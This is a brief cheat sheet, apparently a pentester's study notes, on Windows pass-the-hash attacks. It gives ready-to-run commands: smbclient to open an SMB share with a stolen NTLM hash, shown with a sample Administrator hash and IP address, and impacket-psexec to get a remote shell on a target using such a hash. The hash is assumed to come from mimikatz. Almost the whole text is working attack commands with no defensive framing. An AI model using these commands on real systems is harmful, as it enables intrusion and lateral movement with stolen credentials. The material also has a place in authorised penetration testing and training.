## Pass The Hash
Windows is a ridiculous operating system.

### SMB Shares
Assuming we have already laid our hands on an NTLM hash courtesy of `mimikatz`, the following command will give us access to an SMB Share with those credentials:
```bash
smbclient \\\\<IP address or computer name>\\<share name> -U <user name> --pw-nt-hash <user hash>
```
for example:
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

### Reverse Shell
We can authenticate to just about anything if the user whose hash we've obtained exists on the target machine, but as usual the holy grail is to just obtain a reverse shell:
```bash
impacket-psexec -hashes 00000000000000000000000000000000:<user hash> <user name>@<target IP>
```